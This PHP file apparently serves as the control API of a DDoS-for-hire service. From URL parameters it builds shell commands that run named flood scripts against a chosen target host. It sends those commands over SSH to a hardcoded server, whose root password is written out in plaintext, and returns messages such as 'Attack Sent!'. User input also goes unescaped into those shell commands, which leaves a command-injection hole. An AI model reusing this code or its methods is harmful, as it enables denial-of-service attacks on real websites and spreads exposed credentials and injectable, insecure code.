<?php

    // Json App Header
header("Content-Type: application/json");

error_rePorting(E_ALL);
ini_set('display_errors', 'Off');
$startreturn = '';

$GET = filter_input_array(INPUT_GET, FILTER_SANITIZE_STRING);

    // Include phpseclib
include('libs/phpseclib/Net/SSH2.php');

    // Check API
$api = $GET['api'];
if($api != 'speed') {
    $message = array(
        "status" => 'false',
        "message" => 'Invalid API Key'
    );

        // Encode
    $print = json_encode($message);
        // Print
    print_r($print);
    die();
}

$geoproxy = @$GET['geoproxy'];
$stopper = @$GET['stopper'];
$stop =  @$GET['stop'];
if($stop == 1) {
//         stop = STOP
    $command = "screen -X -S {$stopper} quit";
} else if($stop == 0) {
        // Define
    $host = @$GET['host'];
    $port = @$GET['port'];
    $method = @$GET['method'];
    (int)$time = @$GET['time'];
    $mode = @$GET['mode'];
    (int)$ratelimit = @$GET['ratelimit'];

        // Check for empty
    if(empty($host)) {
        if(empty($message)) {
            $message = array(
                "status" => 'false',
                "message" => 'host is empty.'
            );
        }
    }


    if(empty($method)) {
        if(empty($message)) {
            $message = array(
                "status" => 'false',
                "message" => 'Attack method is empty.'
            );
        }
    }


        // Is valid host
    if(!filter_var($host, FILTER_VALIDATE_URL)) {
        if(empty($message)) {
            $message = array(
                "status" => 'false',
                "message" => 'Invalid host.'
            );
        }
    }


 if ($ratelimit > 128) {
        $message = array(
            "status" => 'false',
            "message" => 'Not correct ratelimit.'
        );
    }

        // Check Methods
	if($method == "browser") { $command = "browser-v2 $host $port $time "; }
	else if($method == "2") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999; cd HTTPS-ACID; chmod 777 *; screen -dmS {$stopper} node acid.js $host $geoproxy $time $mode 8"; }
	else if($method == "3") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999; cd HTTPS-CONNECT; chmod 777 *; screen -dmS {$stopper} node connect.js $mode $host $geoproxy $time $ratelimit 8"; }
	else if($method == "4") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999; cd HTTPS-POWER; chmod 777 *; screen -dmS {$stopper} node power.js $mode $host $geoproxy $time $ratelimit 8 randomstring=? "; }
	else if($method == "5") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999; cd HTTPS-SOCKET; chmod 777 *; screen -dmS {$stopper} node socket.js $host $geoproxy $time $ratelimit"; }
	else if($method == "HTTP-SLAY") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999; cd HTTPS-SPAM; chmod 777 *; screen -dmS {$stopper} node spam.js $host $time 8 $geoproxy $ratelimit"; }
	else if($method == "7") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999; cd HCAPTCHAv12[JS]; chmod 777 *; screen -dmS {$stopper} node browser.js $mode $host good.txt $time 70 $ratelimit ''"; }
	else if($method == "8") { $command = "ulimit -n999999; ulimit -u999999; ulimit -e999999; cd WSS-FLOOD; chmod 777 *; screen -dmS {$stopper} node config.js $host $time"; }


    else {
        if(empty($message)) {
            $message = array(
                "status" => 'false',
                "message" => 'Invalid method. '.$method
            );
        }
    }
}

    // Servers Login Function
$SERVERS = array(
	"135.181.220.173"       =>      array("root", "wACr4x2krJuUp6"),
 );

if(empty($message)) {
        // Start Function
    foreach ($SERVERS as $server => $credentials) {
        $ssh = new Net_SSH2($server);
        if ($ssh->login($credentials[0], $credentials[1]) == true) {
            $ssh->exec($command);
            $startreturn = true;
        } else {
            $startreturn = false;
            break;
        }
    }
}

if($startreturn == false) {
    foreach ($SERVERS as $server => $credentials) {
        $ssh = new Net_SSH2($server);
        if ($ssh->login($credentials[0], $credentials[1]) == true) {
            $ssh->exec("screen -X -S {$stopper} quit");
        }
    }
}

if($startreturn == true) {
    if($stop == 1) {
        $message = array(
            "status" => 'true',
            "message" => 'Attack Stopped!'
        );
    } else {
        $message = array(
            "status" => 'true',
            "message" => 'Attack Sent!'
        );
    }
} else if($startreturn == false) {
    if(empty($message)) {
        $message = array(
            "status" => 'false',
            "message" => 'Servers are broken. Please contact supPort!'
        );
    }
} else {
    if(empty($message)) {
        $message = array(
            "status" => 'false',
            "message" => 'Error!'
        );
    }
}

    // Encode
$print = json_encode($message);
    // Print
print_r($print);
die();

?>